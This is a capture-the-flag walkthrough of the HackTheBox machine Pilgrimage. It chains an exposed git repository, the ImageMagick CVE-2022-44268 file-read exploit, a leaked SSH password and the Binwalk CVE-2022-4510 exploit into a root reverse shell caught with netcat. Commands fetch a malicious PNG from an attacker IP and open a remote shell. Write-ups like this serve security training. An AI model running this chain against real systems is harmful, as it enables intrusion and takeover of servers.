After using whatweb we see a vhost

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Pilgrimage-10.10.11.219/nmap]
└─$ whatweb http://10.10.11.219:80/ 
http://10.10.11.219:80/ [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.219], RedirectLocation[http://pilgrimage.htb/], Title[301 Moved Permanently], nginx[1.18.0]
ERROR Opening: http://pilgrimage.htb/ - no address for pilgrimage.htb
```

We added to /etc/hosts and now we can retrieve info

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Pilgrimage-10.10.11.219/nmap]
└─$ whatweb http://10.10.11.219:80/
http://10.10.11.219:80/ [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.219], RedirectLocation[http://pilgrimage.htb/], Title[301 Moved Permanently], nginx[1.18.0]
http://pilgrimage.htb/ [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], IP[10.10.11.219], JQuery, Script, Title[Pilgrimage - Shrink Your Images], nginx[1.18.0]
```

As we see in the nmap scan, there is a git repository in the url http://10.10.11.291/.git so using git-dumper we retrieve the code.

```bash
git-dumper http://10.10.11.291/.git git
```

And now we can read the code of the app. In the `index.php` file we find the following code

```bash
$upload = $image->upload();

if($upload) {
	$mime = ".png";
	$imagePath = $upload->getFullPath();
	if(mime_content_type($imagePath) === "image/jpeg") {
		$mime = ".jpeg";
	}
	$newname = uniqid();
		exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
	unlink($upload->getFullPath());
	$upload_path = "http://pilgrimage.htb/shrunk/" . $newname . $mime;

	if(isset($_SESSION['user'])) {
		$db = new PDO('sqlite:/var/db/pilgrimage');
		$stmt = $db->prepare("INSERT INTO `images` (url,original,username) VALUES (?,?,?)");
		$stmt->execute(array($upload_path,$_FILES["toConvert"]["name"],$_SESSION['user']));
	}
	header("Location: /?message=" . $upload_path . "&status=success");
}
else {
	header("Location: /?message=Image shrink failed&status=fail");
}
```

As we can see, the app uses a binary called magic to convert the images. Lets check the app

```bash
┌──(kali㉿kali)-[~/…/Boxes/Pilgrimage-10.10.11.219/git/git]
└─$ ls
assets         index.php  logout.php  register.php
dashboard.php  login.php  magick      vendor

┌──(kali㉿kali)-[~/…/Boxes/Pilgrimage-10.10.11.219/git/git]
└─$ ./magick -help
Usage: magick tool [ {option} | {image} ... ] {output_image}
Usage: magick [ {option} | {image} ... ] {output_image}
       magick [ {option} | {image} ... ] -script {filename} [ {script_args} ...]
       magick -help | -version | -usage | -list {option}
                                                                                
┌──(kali㉿kali)-[~/…/Boxes/Pilgrimage-10.10.11.219/git/git]
└─$ ./magick -version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```
It is ImageMagick 7.1.0-49 beta, and using google we found **[this exploit](https://github.com/voidz0r/CVE-2022-44268)**. Clone the repository and execute it pointing the file we want to read, in this case `/etc/passwd`

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Pilgrimage-10.10.11.219/CVE-2022-44268]
└─$ cargo run "/etc/passwd"       
    Finished dev [unoptimized + debuginfo] target(s) in 0.23s
     Running `target/debug/cve-2022-44268 /etc/passwd`
                                                                                
┌──(kali㉿kali)-[~/Documents/Boxes/Pilgrimage-10.10.11.219/CVE-2022-44268]
└─$ ls
Cargo.lock  Cargo.toml  image.png  README.md  screens  src  target
```

Upload the image.png file and save the output image. With identify we can extract the HEX encoded information

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Pilgrimage-10.10.11.219/CVE-2022-44268]
└─$ identify -verbose image-result.png     
Image: image-result.png
  Format: PNG (Portable Network Graphics)
  Geometry: 100x100
  Class: PseudoClass
  Type: palette
  Depth: 1 bits-per-pixel component
  Channel Depths:
    Red:      1 bits
    Green:    1 bits
    Blue:     1 bits
  Channel Statistics:
    Red:
      Minimum:                 65535.00 (1.0000)
      Maximum:                 65535.00 (1.0000)
      Mean:                    65535.00 (1.0000)
      Standard Deviation:          0.00 (0.0000)
    Green:
      Minimum:                     0.00 (0.0000)
      Maximum:                     0.00 (0.0000)
      Mean:                        0.00 (0.0000)
      Standard Deviation:          0.00 (0.0000)
    Blue:
      Minimum:                     0.00 (0.0000)
      Maximum:                     0.00 (0.0000)
      Mean:                        0.00 (0.0000)
      Standard Deviation:          0.00 (0.0000)
  Colors: 2
    0: (255,  0,  0)      red
    1: (255,255,255)      white
  Gamma: 0.45455
  Chromaticity:
    red primary: (0.64,0.33)
    green primary: (0.3,0.6)
    blue primary: (0.15,0.06)
    white point: (0.3127,0.329)
  Filesize: 1.1Ki
  Interlace: No
  Orientation: Unknown
  Background Color: #FEFEFE
  Border Color: #DFDFDF
  Matte Color: #BDBDBD
  Page geometry: 100x100+0+0
  Compose: Over
  Dispose: Undefined
  Iterations: 0
  Compression: Zip
  Png:IHDR.color-type-orig: 3
  Png:IHDR.bit-depth-orig: 1
  Raw profile type: 

    1437
726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d
6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f
6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e
2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269
6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f
62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d
65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a
2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a
783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372
2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73
706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31
303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f
6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573
722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d
646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b
75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f
7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69
7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67
696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73
62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d
5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e
6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334
3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e
2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374
656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72
6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65
6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e
0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052
65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973
74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573
796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69
7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c
6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d
652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78
3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f
7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f
737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938
3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a

  Date:create: 2023-08-13T15:49:37+00:00
  Date:modify: 2023-08-13T15:49:37+00:00
  Date:timestamp: 2023-08-13T15:49:37+00:00
  Signature: c7d03a3453434db9720fd67b559185125d9bdb1fe9c25c182783170e2ba6a8f6
  Tainted: False
  Elapsed Time: 0m:0.001388s
  Pixels Per Second: 6.9Mi
```

Using a converter we see the following info

![[Pasted image 20230813175538.png]]

Here we can see an useful user called emily. Going back to the code we find an useful file to extract with the exploit

```bash
function fetchImages() {
	$username = $_SESSION['user'];
	$db = new PDO('sqlite:/var/db/pilgrimage');
	$stmt = $db->prepare("SELECT * FROM images WHERE username = ?");
	$stmt->execute(array($username));
	$allImages = $stmt->fetchAll(\PDO::FETCH_ASSOC);
	return json_encode($allImages);
}
```

So repeat the process to extract `/var/db/pilgrimage` file

![[Pasted image 20230813180400.png]]

And we found emily word next to what seems to be her credentials. Trying with ssh emily:abigchonkyboi123 it succeeded. So now lets escalate privileges

With linpeas we found a continous proccess which is executing a script called malwarescan.sh

```bash
root         709  0.0  0.0   6816  2292 ?        S    Aug13   0:00 /bin/bash /usr/sbin/malwarescan.sh

emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh 
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```

This process is checking the upload images (new files in the shrunk folder) for malware. For that process it is using the binary `/usr/local/bin/binwalk`

```bash
emily@pilgrimage:/usr/local/bin$ ./binwalk -h

Binwalk v2.3.2
Craig Heffner, ReFirmLabs
https://github.com/ReFirmLabs/binwalk

Usage: binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] ...

Signature Scan Options:
    -B, --signature              Scan target file(s) for common file signatures
    -R, --raw=<str>              Scan target file(s) for the specified sequence [SNIP]    
```

The binary is the app Binwalk v2.3.2 and googling it we found **[this exploit](https://www.exploit-db.com/exploits/51249)**. For this exploit we just introduce a image to process, indicate a IP and Port to get a reverse connection, and it will generate a malicious png file which will get a reverse shell after processing it with binwalk

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Pilgrimage-10.10.11.219]
└─$ python3 51249 CVE-2022-44268/image.png 10.10.14.14 1234 

################################################
------------------CVE-2022-4510----------------
################################################
--------Binwalk Remote Command Execution--------
------Binwalk 2.1.2b through 2.3.2 included-----
------------------------------------------------
################################################
----------Exploit by: Etienne Lacoche-----------
---------Contact Twitter: @electr0sm0g----------
------------------Discovered by:----------------
---------Q. Kaiser, ONEKEY Research Lab---------
---------Exploit tested on debian 11------------
################################################


You can now rename and share binwalk_exploit and start your local netcat listener.
                                                                            
┌──(kali㉿kali)-[~/Documents/Boxes/Pilgrimage-10.10.11.219]
└─$ ls
51249  binwalk_exploit.png  CVE-2022-44268  git  nmap
```

Upload the generated png file to the server and process it with binwalk (it will process automatically while inserted in the shrunk folder, as we saw in the process)

```bash
emily@pilgrimage:/usr/local/bin$ cd /var/www/pilgrimage.htb/shrunk/
emily@pilgrimage:/var/www/pilgrimage.htb/shrunk$ wget http://10.10.14.14/binwalk_exploit.png
--2023-08-14 02:20:05--  http://10.10.14.14/binwalk_exploit.png
Connecting to 10.10.14.14:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2341 (2.3K) [image/png]
Saving to: ‘binwalk_exploit.png’

binwalk_exploit.png 100%[================>]   2.29K  --.-KB/s    in 0.002s  

2023-08-14 02:20:05 (1.07 MB/s) - ‘binwalk_exploit.png’ saved [2341/2341]

-----------------------------

┌──(kali㉿kali)-[~/Documents/Boxes/Pilgrimage-10.10.11.219]
└─$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.219] 33758
whoami
root
```

And we are root
